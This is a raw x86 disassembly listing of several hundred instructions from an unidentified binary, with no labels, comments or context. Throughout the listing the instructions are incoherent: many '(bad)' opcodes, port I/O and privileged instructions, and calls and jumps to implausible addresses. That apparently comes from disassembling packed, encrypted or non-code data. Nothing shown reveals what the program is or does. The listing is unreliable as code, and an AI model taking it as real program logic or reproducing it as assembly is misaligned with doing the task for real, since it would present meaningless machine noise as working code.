  40ee33:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ee37:	jge    0x40ee21
  40ee39:	add    al,0x1
  40ee3b:	add    DWORD PTR [eax],0x0
  40ee3e:	jne    0x40ee40
  40ee40:	je     0x40ee87
  40ee42:	mov    eax,DWORD PTR [edi]
  40ee44:	ror    BYTE PTR [ebp+0x4d],1
  40ee47:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ee4e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ee54:	mov    DWORD PTR [ebx],ebp
  40ee56:	fadd   DWORD PTR [eax+0x75]
  40ee59:	inc    eax
  40ee5a:	pop    eax
  40ee5b:	lea    ebx,[ecx+0x4f]
  40ee5e:	push   0xb1000003
  40ee63:	out    dx,eax
  40ee64:	add    ebp,DWORD PTR [edx+edx*2]
  40ee67:	add    BYTE PTR [ebx+ecx*4],bh
  40ee6a:	mov    ch,BYTE PTR [ebx]
  40ee6c:	jb     0x40eee0
  40ee6e:	add    al,0x89
  40ee70:	push   eax
  40ee71:	call   0x84293be3
  40ee76:	add    DWORD PTR [eax+eax*1],eax
  40ee79:	jae    0x40ee8f
  40ee7b:	icebp  
  40ee7c:	inc    ebp
  40ee7d:	mov    eax,DWORD PTR gs:[ecx]
  40ee80:	int3   
  40ee81:	out    dx,al
  40ee82:	loopne 0x40eed1
  40ee84:	sub    eax,DWORD PTR [edx]
  40ee86:	push   0xffffff83
  40ee88:	pop    esi
  40ee89:	push   cs
  40ee8a:	jl     0x40eea5
  40ee8c:	add    al,0xaf
  40ee8e:	xor    eax,0x832b6d00
  40ee93:	mov    eax,DWORD PTR [edx]
  40ee95:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40ee9b:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40eea1:	inc    ebp
  40eea2:	shr    ebx,0x3
  40eea5:	or     DWORD PTR [eax],0x4
  40eea8:	push   0xffffffa5
  40eeaa:	pop    esi
  40eeab:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40eeb2:	jmp    0x40ef11
  40eeb4:	mov    edi,0xff0272
  40eeb9:	fdivr  QWORD PTR [ebp+0x5d]
  40eebc:	push   0x4e
  40eebe:	pop    ecx
  40eebf:	call   0x4132c4
  40eec4:	mov    DWORD PTR [ebx],eax
  40eec6:	in     al,0xc8
  40eec8:	rol    BYTE PTR [ebp-0x75],0xc1
  40eecc:	call   0xaaf0ad
  40eed1:	pop    esi
  40eed2:	enter  0xceff,0x8b
  40eed6:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eeda:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40eee1:	je     0x40eee3
  40eee3:	or     DWORD PTR [ebx-0x74183b24],eax
  40eee9:	jne    0x40eecf
  40eeeb:	jmp    0x40eee6
  40eeed:	push   DWORD PTR [edx-0x24]
  40eef0:	push   0x4d
  40eef2:	pop    ecx
  40eef3:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40eef7:	jge    0x40eeff
  40eef9:	mov    eax,eax
  40eefb:	sub    ebp,DWORD PTR [edx+0x24]
  40eefe:	pop    esi
  40eeff:	inc    ebp
  40ef00:	mov    esp,0x8b6077
  40ef05:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40ef0b:	lods   al,BYTE PTR ds:[esi]
  40ef0c:	add    BYTE PTR [ebx],bh
  40ef0e:	enter  0xce73,0x49
  40ef12:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40ef1a:	stc    
  40ef1b:	jge    0x40ef8f
  40ef1d:	jnp    0xdd40727e
  40ef23:	call   0xc3eff9
  40ef28:	fadd   st(0),st
  40ef2a:	dec    esi
  40ef2b:	ins    BYTE PTR es:[edi],dx
  40ef2c:	stc    
  40ef2d:	cmp    al,0x73
  40ef2f:	push   ebp
  40ef30:	mov    eax,0xf8028b
  40ef35:	jne    0x40eef8
  40ef37:	mov    esi,ecx
  40ef39:	mov    esp,DWORD PTR [ebp+0x2c]
  40ef3c:	add    edi,DWORD PTR [ebp-0x24]
  40ef3f:	sub    esp,eax
  40ef41:	and    al,0x45
  40ef43:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40ef49:	sbb    al,0xee
  40ef4b:	pop    esi
  40ef4c:	call   0x80ef7c
  40ef51:	fsubr  st,st(3)
  40ef53:	sti    
  40ef54:	add    BYTE PTR gs:[ecx],bh
  40ef57:	add    eax,esp
  40ef59:	add    DWORD PTR [esi],eax
  40ef5b:	rol    DWORD PTR [ebp+0x8],0x29
  40ef5f:	mov    esp,eax
  40ef61:	clc    
  40ef62:	jne    0x40efd9
  40ef64:	mov    eax,0x8b0673
  40ef69:	loopne 0x40efb0
  40ef6b:	loopne 0x40eef6
  40ef6d:	lods   al,BYTE PTR ds:[esi]
  40ef6e:	int3   
  40ef6f:	inc    ebp
  40ef70:	mov    DWORD PTR gs:[eax+edi*8],eax
  40ef74:	add    al,0xc3
  40ef76:	sub    ecx,DWORD PTR [ebp+0x47]
  40ef79:	(bad)  
  40ef7b:	shr    BYTE PTR [ebp-0x1f],0xe8
  40ef7f:	add    eax,DWORD PTR [eax]
  40ef81:	call   0x642b086
  40ef86:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40ef8c:	dec    esi
  40ef8d:	ins    DWORD PTR es:[edi],dx
  40ef8e:	in     al,dx
  40ef8f:	lea    eax,[eax]
  40ef91:	inc    ebp
  40ef92:	inc    ebp
  40ef93:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40ef99:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40efa3:	and    al,0xdc
  40efa5:	ror    DWORD PTR [edx+0x24],0xf7
  40efa9:	or     BYTE PTR [ebp+0x4c],dh
  40efac:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40efb0:	stos   BYTE PTR es:[edi],al
  40efb1:	adc    edx,edi
  40efb3:	inc    esp
  40efb4:	add    edi,DWORD PTR [eax]
  40efb6:	jne    0x40ef9b
  40efb8:	mov    DWORD PTR [eax-0x7449db04],ecx
  40efbe:	cmp    ecx,DWORD PTR [edi]
  40efc0:	sub    BYTE PTR [ebp-0x7e],dl
  40efc3:	sar    ebp,0xb
  40efc6:	jmp    FWORD PTR [edi+0x2400392a]
  40efcc:	sub    esi,DWORD PTR [ebx-0x73]
  40efcf:	mov    esp,DWORD PTR [ecx+edi*4]
  40efd2:	mov    ecx,DWORD PTR [eax]
  40efd4:	and    BYTE PTR [eax],al
  40efd6:	jne    0x40efa2
  40efd8:	sub    ebp,ecx
  40efda:	sbb    BYTE PTR [esi+0x32],ah
  40efdd:	dec    ebp
  40efde:	push   ebp
  40efdf:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40efe5:	ret    
  40efe6:	mov    edx,ebp
  40efe8:	leave  
  40efe9:	sub    DWORD PTR [esi+0x24],ebx
  40efec:	ret    0x2b
  40efef:	pop    ax
  40eff1:	push   ebp
  40eff2:	rol    BYTE PTR [ebx],0xeb
  40eff5:	add    DWORD PTR [ecx+0x6c0001],0x40
  40effc:	jb     0x40f053
  40effe:	ret    
  40efff:	in     al,dx
  40f000:	jecxz  0x40ef8d
  40f002:	push   esi
  40f003:	xchg   esp,eax
  40f004:	jne    0x40f006
  40f006:	cmp    edx,DWORD PTR [esi+0x1c]
  40f009:	jne    0x40efef
  40f00b:	mov    eax,DWORD PTR [ebp-0x77]
  40f00e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f015:	mov    esi,DWORD PTR [ebp-0x75]
  40f018:	pop    esi
  40f019:	nop
  40f01a:	mov    eax,DWORD PTR [eax]
  40f01c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f022:	add    al,0x0
  40f024:	inc    ebp
  40f025:	mov    eax,DWORD PTR [ebx]
  40f027:	mov    ebp,ebx
  40f029:	cmp    al,0xf
  40f02b:	or     al,al
  40f02d:	inc    ebp
  40f02e:	inc    ebp
  40f02f:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  40f035:	cld    
  40f036:	add    BYTE PTR [edi+0x546c16c0],dh
  40f03c:	add    BYTE PTR [ecx-0x5],dl
  40f03f:	add    eax,0x17200
  40f044:	sbb    al,0x85
  40f046:	dec    esp
  40f047:	je     0x40f081
  40f049:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f04d:	add    BYTE PTR [ebx],bh
  40f04f:	(bad)  
  40f050:	and    al,0x32
  40f052:	jae    0x40eff0
  40f054:	mov    cl,cl
  40f056:	inc    DWORD PTR [esp]
  40f059:	push   ebp
  40f05a:	shr    esp,0x8
  40f05d:	in     al,dx
  40f05e:	push   esp
  40f05f:	add    DWORD PTR [eax],esp
  40f061:	add    bl,cl
  40f063:	inc    ebp
  40f064:	mov    bh,0x53
  40f066:	add    BYTE PTR [ebp-0x17],al
  40f069:	push   esi
  40f06a:	cmovne ecx,edx
  40f06d:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f071:	push   edi
  40f072:	pop    ss
  40f073:	xor    ecx,ebx
  40f075:	pushf  
  40f076:	add    BYTE PTR [ecx+0x452bf800],cl
  40f07c:	rcr    ecx,0x5
  40f07f:	inc    ebp
  40f080:	add    edx,ebx
  40f082:	add    BYTE PTR [ebp-0x40],al
  40f085:	out    0x6c,eax
  40f087:	inc    ebp
  40f088:	inc    eax
  40f089:	sub    eax,0x450546c1
  40f08e:	dec    esp
  40f08f:	sub    al,0x20
  40f091:	inc    ebp
  40f092:	fnstcw WORD PTR [esi+0x29]
  40f095:	leave  
  40f096:	add    BYTE PTR [esi+0xc000c0],bh
  40f09c:	lea    eax,[esp-0x40]
  40f0a0:	ret    
  40f0a1:	mov    dh,0x8b
  40f0a3:	xor    edx,DWORD PTR [ecx+0x3]
  40f0a6:	mov    al,BYTE PTR [ecx+0x1]
  40f0a9:	sbb    BYTE PTR [eax],al
  40f0ab:	stc    
  40f0ac:	mov    esi,DWORD PTR [edx+0x8]
  40f0af:	(bad)  
  40f0b0:	ss mov eax,0xb98ac631
  40f0b6:	add    esi,eax
  40f0b8:	add    BYTE PTR [edx-0x444d39f7],bh
  40f0be:	add    esi,eax
  40f0c0:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  40f0c7:	mov    BYTE PTR [eax],0xbe
  40f0ca:	or     BYTE PTR [ebx],dh
  40f0cc:	dec    ecx
  40f0cd:	lea    eax,[ebx]
  40f0cf:	or     eax,0x18fc0fc7
  40f0d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d5:	(bad)  
  40f0d7:	fiadd  WORD PTR [ebp-0x78]
  40f0da:	jae    0xed75f829
  40f0e0:	or     BYTE PTR [ebp+0x7],al
  40f0e3:	in     eax,dx
  40f0e4:	fwait
  40f0e5:	inc    ebp
  40f0e6:	xor    ah,dh
  40f0e8:	pop    esi
  40f0e9:	inc    ebp
  40f0ea:	shl    edx,0xc
  40f0ed:	inc    ebp
  40f0ee:	sub    cl,0x1
  40f0f1:	inc    ebp
  40f0f2:	add    bh,bl
  40f0f4:	add    BYTE PTR [ebp-0x7b],al
  40f0f7:	out    dx,al
  40f0f8:	clc    
  40f0f9:	inc    ebp
  40f0fa:	ret    0xe7
  40f0fd:	inc    ebp
  40f0fe:	mov    edi,DWORD PTR [esi-0x7f]
  40f101:	leave  
  40f102:	and    al,0x44
  40f104:	add    BYTE PTR [eax+0x331cb68b],dh
  40f10a:	mov    DWORD PTR [ebx],eax
  40f10c:	sbb    al,0x41
  40f10e:	(bad)  
  40f10f:	sbb    al,ah
  40f111:	stc    
  40f112:	test   DWORD PTR [edx-0x8],esi
  40f115:	lea    edi,[edi-0x7007a98]
  40f11b:	mov    DWORD PTR [ebp-0x2c],edi
  40f11e:	(bad)  
  40f11f:	dec    ebp
  40f120:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  40f127:	add    edx,eax
  40f129:	(bad)  
  40f12a:	(bad)  
  40f12b:	inc    ebx
  40f12d:	jmp    FWORD PTR [edx-0x38]
  40f130:	(bad)  
  40f131:	or     al,ah
  40f133:	jge    0x40f0fb
  40f135:	mov    ebp,0x5a8533e4
  40f13b:	clc    
  40f13c:	enter  0x45,0x8b
  40f140:	lea    ecx,[ebp+ecx*1+0x18330f00]
  40f147:	mov    edi,0x7de08da
  40f14c:	mov    BYTE PTR [ebx+0x39063283],bl
  40f152:	in     eax,dx
  40f153:	cmovne edx,ebx
  40f156:	jmp    0x40f158
  40f158:	inc    ebp
  40f159:	mov    ebp,ebp
  40f15b:	sbb    al,0x45
  40f15d:	mov    ebx,ebx
  40f15f:	add    DWORD PTR [ebp+0x0],eax
  40f162:	in     al,dx
  40f163:	add    DWORD PTR [ebp+0x4d],eax
  40f166:	sub    eax,0x2c80458b
  40f16b:	add    BYTE PTR [ebp-0x77],al
  40f16e:	jle    0x40f1da
  40f170:	leave  
  40f171:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6e6
  40f179:	inc    ebp
  40f17a:	add    ebx,edi
  40f17c:	inc    ecx
  40f17d:	out    0x18,eax
  40f17f:	(bad)  
  40f180:	stc    
  40f181:	int3   
  40f182:	jb     0x40f10e
  40f184:	(bad)  
  40f185:	xor    dh,BYTE PTR [eax-0x4ec73980]
  40f18b:	or     dh,al
  40f18d:	dec    esi
  40f18e:	mov    dl,0xf3
  40f190:	mov    BYTE PTR [ebp-0x4d],0x89
  40f194:	(bad)  
  40f195:	loopne 0x40f14b
  40f197:	inc    esi
  40f199:	lea    esi,[ebp-0x49003924]
  40f19f:	push   eax
  40f1a0:	mov    BYTE PTR [ebp-0x49],0x33
  40f1a4:	xor    eax,DWORD PTR [ebx]
  40f1a6:	lea    edx,[eax+0xd]
  40f1a9:	inc    ebp
  40f1aa:	jae    0x8c1b57c8
  40f1b0:	ficomp WORD PTR [eax+ecx*4]
  40f1b3:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f1ba:	test   esi,edi
  40f1bc:	(bad)  
  40f1bd:	(bad)  
  40f1be:	inc    DWORD PTR [eax]
  40f1c0:	inc    ebp
  40f1c1:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  40f1c7:	test   DWORD PTR [ebx],edx
  40f1c9:	jne    0x40f154
  40f1cb:	or     DWORD PTR [ebx-0xed9771],0x75703b8e
  40f1d5:	jmp    0x124f263
  40f1da:	inc    ebp
  40f1db:	jne    0x40f1c9
  40f1dd:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  40f1e4:	mov    BYTE PTR [ebp+0x45009c01],cl
  40f1ea:	shl    BYTE PTR [eax],0x54
  40f1ed:	push   cx
  40f1ef:	mov    bx,0x7245
  40f1f3:	gs add bh,al
  40f1f6:	add    DWORD PTR [ebp+eax*4+0xe601df],ebx
  40f1fd:	inc    ebp
  40f1fe:	dec    ebp
  40f1ff:	int3   
  40f200:	mov    esp,ebx
  40f202:	jl     0x40f1cb
  40f204:	add    BYTE PTR [ecx+ecx*4+0x1ce28bdb],ah
  40f20b:	inc    ebp
  40f20c:	mov    edi,ebx
  40f20e:	add    ebp,esp
  40f210:	add    BYTE PTR [esi+0x1],ah
  40f213:	inc    ebp
  40f214:	or     BYTE PTR [edi],bh
  40f216:	inc    ebp
  40f217:	(bad)  
  40f218:	in     eax,dx
  40f219:	fsubr  st(2),st
  40f21b:	inc    edi
  40f21d:	add    dl,al
  40f21f:	add    dh,ch
  40f221:	call   0x860aa4
  40f226:	pop    esi
  40f227:	test   DWORD PTR [eax],ecx
  40f229:	dec    dl
  40f22b:	(bad)  
  40f22c:	jmp    0x413f7ab6
  40f231:	push   DWORD PTR [ebp-0x75]
  40f234:	(bad)  
  40f235:	loopne 0x40f203
  40f237:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  40f241:	push   eax
  40f242:	inc    DWORD PTR [ebp-0x75]
  40f245:	mov    esp,eax
  40f247:	cwde   
  40f248:	mov    DWORD PTR [eax],0xff8bffc3
  40f24e:	sbb    al,0x8
  40f250:	ror    BYTE PTR [ebp+0x50],0x51
  40f254:	inc    ebp
  40f255:	ror    BYTE PTR [ebx+0x65987d],1
  40f25b:	test   edi,eax
  40f25d:	add    al,0xdc
  40f25f:	add    bh,bh
  40f261:	push   0x1
  40f263:	add    BYTE PTR [eax],al
  40f265:	mov    edi,edi
  40f267:	inc    WORD PTR [ebp+0x8]
  40f26b:	add    eax,0xd
  40f26e:	(bad)  
  40f270:	xor    eax,0x782ec89
  40f275:	push   ecx
  40f276:	cli    
  40f277:	popw   es
  40f279:	push   ebp
  40f27a:	xchg   BYTE PTR [ebx-0x76740800],al
  40f280:	sbb    al,0x86
  40f282:	test   DWORD PTR [ecx-0x2],edx
  40f285:	call   WORD PTR [ebp-0x40]
  40f289:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  40f28d:	mov    eax,ebx
  40f28f:	mov    dh,BYTE PTR ds:0xc7666851
  40f295:	push   ebp
  40f296:	fsub   QWORD PTR [esi+0x0]
  40f299:	dec    ebp
  40f29a:	inc    ebp
  40f29b:	mov    edx,0xea4ece
  40f2a0:	(bad)  
  40f2a1:	retf   0x89a0
  40f2a4:	fist   DWORD PTR [eax+0x454ae1]
  40f2aa:	call   0xc7a72f3a
  40f2af:	mov    ch,0xa8
  40f2b1:	jmp    eax
  40f2b3:	(bad)  
  40f2b4:	in     eax,dx
  40f2b5:	lock (bad) 
  40f2b7:	mov    DWORD PTR [esi+ebp*2-0x727a0082],ebp
  40f2be:	(bad)  
  40f2bf:	xor    eax,0x700089ff
  40f2c4:	add    bh,bh
  40f2c6:	stos   DWORD PTR es:[edi],eax
  40f2c7:	data16 add BYTE PTR [ebp-0x1b0077],al
  40f2ce:	inc    DWORD PTR [ecx-0x73]
  40f2d1:	data16 fadd QWORD PTR [ebp-0xaf0001]
  40f2d8:	inc    ebp
  40f2d9:	shl    BYTE PTR [ebx],0x66
  40f2dc:	add    eax,DWORD PTR [ebp-0xba00b0]
  40f2e2:	add    DWORD PTR [ecx+0x44],0x66
  40f2e6:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  40f2ec:	add    DWORD PTR [ecx-0xcf8600],ecx
  40f2f2:	push   ebp
  40f2f3:	lea    dx,[ebp-0x28]
  40f2fa:	add    BYTE PTR [ebp-0x25],0xf
  40f2fe:	jge    0xff41f205
  40f304:	mov    ecx,0xc34fc7
  40f309:	rol    ecx,0x89
  40f30c:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  40f310:	ror    BYTE PTR [ebx-0x48990775],0x55
  40f317:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  40f31e:	test   BYTE PTR [ecx-0x3f997f3e],cl
  40f324:	push   ebp
  40f325:	mov    DWORD PTR [ebp-0x76761880],ecx
  40f32b:	or     BYTE PTR [eax+0x6600c265],0x45
  40f332:	push   ebp
  40f333:	xor    DWORD PTR [ebp-0x76381e64],ecx
  40f339:	aam    0x8c
  40f33b:	test   DWORD PTR [ecx-0x3dba7108],ecx
  40f341:	cmp    eax,0xc78b9c00
  40f346:	data16 hlt 
  40f348:	dec    ebp
  40f349:	test   DWORD PTR [ecx+0x454ff8],edi
  40f34f:	xor    ecx,esi
  40f351:	lahf   
  40f352:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  40f358:	mov    eax,DWORD PTR [ecx]
  40f35a:	data16 add BYTE PTR [ebp-0x7400bb],dh
  40f361:	sbb    al,0x71
  40f363:	dec    ebp
  40f364:	mov    si,WORD PTR [ebp-0xff0074]
  40f36b:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  40f371:	add    BYTE PTR [ebp-0x760fd877],cl
  40f377:	jne    0x40f3ed
  40f379:	test   edi,edi
  40f37b:	jne    0x40f300
  40f37d:	(bad)  
  40f37e:	sti    
  40f37f:	sbb    BYTE PTR [ecx-0x1789ab],cl
  40f385:	cld    
  40f386:	(bad)  
  40f387:	jmp    DWORD PTR [ecx]
  40f389:	inc    ebp
  40f38a:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  40f390:	data16 cmp al,0x8d
  40f393:	push   cs
  40f394:	inc    DWORD PTR [ebp-0x1]
  40f397:	test   DWORD PTR [ecx-0x838c],ecx
  40f39d:	sbb    al,0x8b
  40f39f:	lock clc 
  40f3a1:	push   DWORD PTR [edi-0xe39375]
  40f3a7:	xor    BYTE PTR [ebx],0x1
  40f3aa:	add    eax,DWORD PTR [eax]
  40f3ac:	xor    eax,DWORD PTR [eax]
  40f3ae:	mov    WORD PTR [ebp-0xba003d],0x4575
  40f3b7:	mov    ecx,DWORD PTR [edi]
  40f3b9:	sbb    al,0x4d
  40f3bb:	mov    DWORD PTR [ebx],esi
  40f3bd:	add    DWORD PTR [ebx],eax
  40f3bf:	add    BYTE PTR [ebx],dh
  40f3c1:	xor    DWORD PTR [esi-0x80],esp
  40f3c4:	inc    ebp
  40f3c5:	add    DWORD PTR [ebx],esi
  40f3c7:	add    BYTE PTR [esi+0x50],ah
  40f3ca:	inc    ebp
  40f3cb:	jmp    0x85f636
  40f3d0:	add    DWORD PTR [eax+0xc70194],0xffffffec
  40f3d7:	or     BYTE PTR [ebp+0x4501f845],dh
  40f3dd:	jmp    0xdcf6d3
  40f3e2:	(bad)  
  40f3e3:	push   cs
  40f3e4:	in     al,0xc9
  40f3e6:	test   DWORD PTR [ebp+0x4502f8],eax
  40f3ec:	xor    ecx,DWORD PTR [ebp-0x64]
  40f3ef:	mov    eax,edi
  40f3f1:	mov    esp,esp
  40f3f3:	push   eax
  40f3f4:	add    eax,0x45fff885
  40f3f9:	dec    DWORD PTR [ebx+0x339445]
  40f3ff:	add    ecx,DWORD PTR [ecx+0x452ce889]
  40f405:	dec    DWORD PTR [ebx-0x4e0be375]
  40f40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f40c:	add    edi,edi
  40f40e:	add    bh,bh
  40f410:	push   cs
  40f411:	xor    eax,DWORD PTR [eax+0x890103]
  40f417:	xor    BYTE PTR [ebp-0x1],al
  40f41a:	mov    DWORD PTR [ebp-0x36df38],ecx
  40f420:	push   cs
  40f421:	push   eax
  40f422:	jne    0x40f469
  40f424:	mov    esi,DWORD PTR [ebx]
  40f426:	sbb    al,0x3
  40f428:	jne    0x40f47a
  40f42a:	inc    DWORD PTR [ebp-0x75]
  40f42d:	add    eax,0x800f0
  40f432:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  40f438:	mov    DWORD PTR [ecx],eax
  40f43a:	sbb    BYTE PTR [eax],al
  40f43c:	leave  
  40f43d:	test   DWORD PTR [edi-0x1],eax
  40f440:	jne    0x40f441
  40f442:	call   0xff41df47
  40f447:	xor    BYTE PTR [ebp+0x4d],al
  40f44a:	mov    edi,edi
  40f44c:	enter  0x8,0x4d
  40f450:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  40f456:	mov    eax,DWORD PTR [eax]
  40f458:	sbb    al,0x1
  40f45a:	sbb    DWORD PTR [ebp+0x4d],eax
  40f45d:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  40f463:	inc    eax
  40f464:	dec    DWORD PTR [ecx-0x27d775]
  40f46a:	add    BYTE PTR [ebx-0x38d72b01],cl
  40f470:	xchg   ecx,eax
  40f471:	ret    
  40f472:	add    BYTE PTR [ebp-0x830075],al
  40f478:	add    BYTE PTR [ebp-0x75],al
  40f47b:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  40f481:	lea    edi,[edi+0x20]
  40f484:	add    bh,bh
  40f486:	mov    edx,DWORD PTR [eax-0x7b]
  40f489:	inc    ebp
  40f48a:	rdpmc  
  40f48c:	jne    0x40f491
  40f48e:	add    BYTE PTR [eax-0x75],dl
  40f491:	inc    ebp
  40f492:	call   0x4040fd9c
  40f497:	add    BYTE PTR [ecx-0xe3d775],cl
  40f49d:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  40f4a4:	ret    
  40f4a5:	inc    DWORD PTR [ebp-0xff0001]
  40f4ab:	add    BYTE PTR [ebp-0x4b],al
  40f4ae:	cmp    edi,0x24
  40f4b1:	(bad)  
  40f4b2:	push   DWORD PTR [eax]
  40f4b4:	add    BYTE PTR [ebp-0x39],dl
  40f4b7:	test   ebx,eax
  40f4b9:	je     0x40f440
  40f4bb:	mov    edi,edi
  40f4bd:	sbb    bh,bh
  40f4bf:	test   DWORD PTR gs:[eax],eax
  40f4c2:	(bad)  
  40f4c3:	js     0x40f4c4
  40f4c5:	add    BYTE PTR [ebx-0x38b21fdd],cl
  40f4cb:	sub    eax,ebx
  40f4cd:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  40f4d3:	add    eax,DWORD PTR [eax]
  40f4d5:	dec    ebp
  40f4d6:	push   eax
  40f4d7:	mov    al,BYTE PTR [ebp+0x1]
  40f4da:	mov    eax,DWORD PTR [ebp-0x68]
  40f4dd:	mov    eax,DWORD PTR [eax]
  40f4df:	cld    
  40f4e0:	(bad)  
  40f4e1:	or     BYTE PTR [eax],ah
  40f4e3:	dec    ebp
  40f4e4:	inc    DWORD PTR [eax+0x4]
  40f4e7:	push   ecx
  40f4e8:	add    BYTE PTR [edx-0x1],dh
  40f4eb:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  40f4f1:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  40f4fb:	add    ecx,DWORD PTR [ecx-0xf037477]
  40f501:	push   ecx
  40f502:	xor    BYTE PTR [ebx],al
  40f504:	inc    ebp
  40f505:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  40f50b:	(bad)  
  40f50c:	push   eax
  40f50e:	inc    DWORD PTR [eax]
  40f510:	inc    ebp
  40f511:	add    BYTE PTR [ebx],dh
  40f513:	add    BYTE PTR [ebx],0x0
  40f516:	mov    DWORD PTR [ebx-0x150007d4],eax
  40f51c:	lea    edx,[ebp-0x6c]
  40f51f:	je     0x40f4a6
  40f521:	(bad)  
  40f522:	dec    DWORD PTR [eax]
  40f524:	call   DWORD PTR [ebp-0x7b]
  40f527:	mov    edi,edi
  40f529:	hlt    
  40f52a:	call   DWORD PTR [ebp-0x75]
  40f52d:	mov    esp,eax
  40f52f:	cwde   
  40f530:	(bad)  
  40f531:	mov    bh,0xc3
  40f533:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  40f539:	add    DWORD PTR [eax],0x450050ff
  40f53f:	mov    DWORD PTR [ebx+0x9598c8],ecx
  40f545:	inc    edi
  40f547:	jmp    DWORD PTR [eax]
  40f549:	jmp    0xcd00:0x650481ff
  40f550:	mov    DWORD PTR [ebx],esi
  40f552:	and    al,0x81
  40f554:	(bad)  
  40f555:	cmp    al,0xff
  40f557:	pushf  
  40f558:	push   DWORD PTR [ebp+0x8]
  40f55b:	mov    eax,eax
  40f55d:	add    esi,DWORD PTR [eax]
  40f55f:	enter  0x3c45,0x83
  40f563:	add    ah,bh
  40f565:	adc    DWORD PTR [ebx+0x768b5055],eax
  40f56b:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  40f571:	mov    esi,eax
  40f573:	xor    BYTE PTR [ebp+0x45],cl
  40f576:	jmp    0x40f503
  40f578:	mov    ebx,DWORD PTR [eax]
  40f57a:	in     al,dx
  40f57b:	inc    ebp
  40f57c:	or     al,0x2
  40f57e:	dec    DWORD PTR [ebp-0x4]
  40f581:	jne    0x40f5d8
  40f583:	mov    ecx,DWORD PTR [eax+0x18558be8]
  40f589:	mov    edi,DWORD PTR [ebx]
  40f58b:	lock push eax
  40f58d:	xchg   ecx,eax
  40f58e:	jmp    0x3414393
  40f593:	adc    al,0x8b
  40f595:	inc    ebp
  40f596:	mov    al,ds:0x8b04008b
  40f59b:	push   ebp
  40f59c:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  40f5a2:	push   ebp
  40f5a3:	test   DWORD PTR [ebx-0x2900d701],ecx
  40f5a9:	inc    ebp
  40f5aa:	dec    ebp
  40f5ab:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  40f5b1:	mov    DWORD PTR [eax],0xe9ff0020
  40f5b7:	add    al,0x0
  40f5b9:	add    BYTE PTR [eax],al
  40f5bb:	mov    eax,edx
  40f5bd:	push   eax
  40f5be:	rol    DWORD PTR [ebp-0xb0077],1
  40f5c4:	bound  eax,QWORD PTR [ebp+0x50]
  40f5c7:	xor    ecx,DWORD PTR [ecx+0x55899803]
  40f5cd:	sub    al,0x89
  40f5cf:	push   esp
  40f5d1:	lea    edx,[ebp-0x6c]
  40f5d4:	jne    0xffd6f4ec
  40f5da:	inc    DWORD PTR [ebp-0x1d0001]
  40f5e0:	jnp    0xc796d5e6
  40f5e6:	mov    eax,ebx
  40f5e8:	fs mov edi,edi
  40f5eb:	sbb    al,0xc1
  40f5ed:	out    dx,al
  40f5ee:	or     al,0x0
  40f5f0:	ret    0x8d50
  40f5f3:	inc    ebp
  40f5f4:	dec    DWORD PTR [ebx+0xfa98d7]
  40f5fa:	test   edi,edi
  40f5fc:	clc    
  40f5fd:	call   FWORD PTR [edi]
  40f5ff:	or     BYTE PTR [eax],cl
  40f601:	inc    ebp
  40f602:	dec    ebp
  40f603:	inc    DWORD PTR [ebx+0x74803114]
  40f609:	add    DWORD PTR [ebx+0x45fc00],ecx
  40f60f:	call   DWORD PTR [eax+edx*1]
  40f612:	add    ecx,DWORD PTR [ebp-0x38]
  40f615:	push   esi
  40f616:	adc    al,0x8
  40f618:	mov    edx,DWORD PTR [ebp-0x14]
  40f61b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f61e:	add    DWORD PTR [ebp-0x68],0xffffff8d
  40f622:	inc    DWORD PTR [esp+esi*8]
  40f625:	inc    ebp
  40f626:	stos   BYTE PTR es:[edi],al
  40f627:	mov    edx,DWORD PTR [ebp+0x1c]
  40f62a:	add    DWORD PTR [ebp-0x10],eax
